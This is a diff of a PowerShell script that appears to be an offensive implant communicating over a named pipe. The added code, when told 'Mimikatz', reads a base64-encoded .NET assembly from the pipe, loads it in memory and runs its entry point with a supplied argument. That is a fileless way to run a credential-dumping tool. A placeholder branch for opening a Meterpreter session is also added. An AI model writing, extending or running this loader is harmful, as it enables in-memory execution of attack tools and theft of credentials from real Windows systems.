@@ -45,11 +45,10 @@ try {
     $sw.AutoFlush = $true # Without autoflush, buffer will flush when the pipe is close, autoflush is necessary for interactive session
     $status = "0"
 }
-catch [TimeoutException] {
+catch {
     Write-Host "Failed to connect to the pipe."
     $pipeClient.Dispose()
 }
-
 
 while($pipeClient.IsConnected){
     if($status -eq "0"){
@@ -68,15 +67,24 @@ while($pipeClient.IsConnected){
     }
 
     elseif($status -eq "2"){
-        $msg = $sr.ReadLine()
-        $assemblyByte = [System.Convert]::FromBase64String($msg)
-        $assembly = [System.Reflection.Assembly]::Load($assemblyByte)
-        Write-Host "Waiting for parameter..."
-        [String]$msg = $sr.ReadLine()
-        Write-Host "Parameter received : ", $msg
-        [String[]]$parameter = @(, $msg)
-        $parameter_invoke = (, $parameter)
-        $assembly.EntryPoint.Invoke($null, $parameter_invoke)
+        # What script to run
+        $script_action = $sr.ReadLine()
+
+        if($script_action -eq "Mimikatz"){
+            $msg = $sr.ReadLine()
+            $assemblyByte = [System.Convert]::FromBase64String($msg)
+            $assembly = [System.Reflection.Assembly]::Load($assemblyByte)
+            Write-Host "Waiting for parameter..."
+            [String]$msg = $sr.ReadLine()
+            Write-Host "Parameter received : ", $msg
+            [String[]]$parameter = @(, $msg)
+            $parameter_invoke = (, $parameter)
+            $assembly.EntryPoint.Invoke($null, $parameter_invoke)
+        }
+        elseif($script_action -eq "Meterpreter"){
+            Write-Host "Opening Meterpreter Session"
+        }
+
         $status = "0"
     }
 
